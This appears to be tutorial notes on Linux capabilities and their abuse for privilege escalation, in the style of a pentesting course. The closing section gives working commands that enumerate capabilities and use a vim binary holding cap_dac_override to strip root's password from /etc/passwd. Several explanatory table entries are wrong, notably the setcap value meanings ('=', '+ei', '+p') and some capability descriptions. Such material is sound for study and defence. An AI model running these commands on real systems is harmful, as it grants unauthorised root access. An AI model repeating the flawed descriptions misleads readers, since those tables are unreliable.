Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted. This allows for more fine-grained control over which processes have access to certain privileges, making it more secure than the traditional Unix model of granting privileges to users and groups.
Some capabilities, such as `cap_sys_admin`, which allows an executable to perform actions with administrative privileges, can be dangerous if they are not used properly. For example, we could exploit them to escalate their privileges, gain access to sensitive information, or perform unauthorized actions. Therefore, it is crucial to set these types of capabilities for properly sandboxed and isolated executables and avoid granting them unnecessarily.

|**Capability**|**Description**|
|---|---|
|`cap_sys_admin`|Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.|
|`cap_sys_chroot`|Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.|
|`cap_sys_ptrace`|Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.|
|`cap_sys_nice`|Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.|
|`cap_sys_time`|Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.|
|`cap_sys_resource`|Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.|
|`cap_sys_module`|Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.|
|`cap_net_bind_service`|Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.|
# Assigning capabilities with setcap
When using the `setcap` command to set capabilities for an executable in Linux, we need to specify the capability we want to set and the value we want to assign. The values we use will depend on the specific capability we are setting and the privileges we want to grant to the executable.

Here are some examples of values that we can use with the `setcap` command, along with a brief description of what they do:

|**Capability Values**|**Description**|
|---|---|
|`=`|This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.|
|`+ep`|This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.|
|`+ei`|This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.|
|`+p`|This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.|
# Abusing capabilities

Several Linux capabilities can be used to escalate a user's privileges to `root`, including:

| **Capability**     | **Description**                                                                                                                                                                                                              |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_setuid`       | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.                                                                                          |
| `cap_setgid`       | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.                                                                                                 |
| `cap_sys_admin`    | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems. |
| `cap_dac_override` | Allows bypassing of file read, write, and execute permission checks.                                                                                                                                                         |
|                    |                                                                                                                                                                                                                              |
|                    |                                                                                                                                                                                                                              |

enumerating for capabilites
```shell-session
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

## cap_dac_override
If we gained access to the system with a low-privilege account, then discovered the `cap_dac_override` capability:


```shell-session
getcap /usr/bin/vim.basic
```

Let us take a look at the `/etc/passwd` file where the user `root` is specified:

```shell-session
cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash
```

We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file:

```shell-session
/usr/bin/vim.basic /etc/passwd
```

We also can make these changes in a non-interactive mode:

```shell-session
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```
